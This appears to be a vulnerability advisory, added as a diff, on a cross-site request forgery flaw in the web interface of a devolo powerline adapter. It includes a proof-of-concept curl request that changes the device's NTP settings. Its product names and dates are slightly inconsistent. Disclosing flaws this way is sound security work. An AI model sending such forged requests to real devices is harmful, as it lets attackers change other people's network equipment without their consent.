@@ -1,0 +1,41 @@
+devolo dLAN 550 duo+ Starter Kit Cross-Site Request Forgery
+
+
+Vendor: devolo AG
+Product web page: https://www.devolo.com
+Affected version: dLAN 500 AV Wireless+ 3.1.0-1 (i386)
+
+Summary: Devolo dLAN® 550 duo+ Starter Kit is Powerlineadapter which is
+a cost-effective and helpful networking alternative for any location
+without structured network wiring. Especially in buildings or residences
+lacking network cables or where updating the wiring would be expensive
+and complicated, Powerline adapters provide networking at high transmission
+rates.
+
+Desc: The web application allows users to perform certain actions via HTTP
+requests without performing any validity checks to verify the requests. The
+devolo web application uses predictable URL/form actions in a repeatable way.
+This can be exploited to perform certain actions with administrative privileges
+if a logged-in user visits a malicious web site.
+
+Tested on: Linux 2.6.31
+
+
+Vulnerability discovered by Stefan Petrushevski aka sm
+                            @zeroscience
+
+
+Advisory ID: ZSL-2019-5507
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5507.php
+
+
+04.10.2017
+
+--
+
+curl -i -s -k  -X 'POST' \
+    -H 'Origin: http://DEVOLO-IP' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Referer: http://DEVOLO-IP/cgi-bin/htmlmgr?_file=%2Fwgl%2Fmain.wgl&_sid=&_style=std&_lang=&_dir=expert&_page=time' \
+    --data-binary $'%3Asys%3ANTPClient.EnableNTP=on&%3Asys%3ANTPClient.NTPServer=waddup.com&%3Asys%3ANTPClient.GMTOffset=%2B01%3A00&%3Asys%3ANTPClient.AutoDaylightSaving=on&_file=%2Fwgl%2Fmain.wgl&_style=std&_lang=&_dir=expert&_page=time&_idx=&_sid=&_csrf=' \
+    'http://DEVOLO-IP/cgi-bin/htmlmgr'
+
+Even though there is a '_csrf' parameter that is being submited, it is never checked (nor it contains any value)
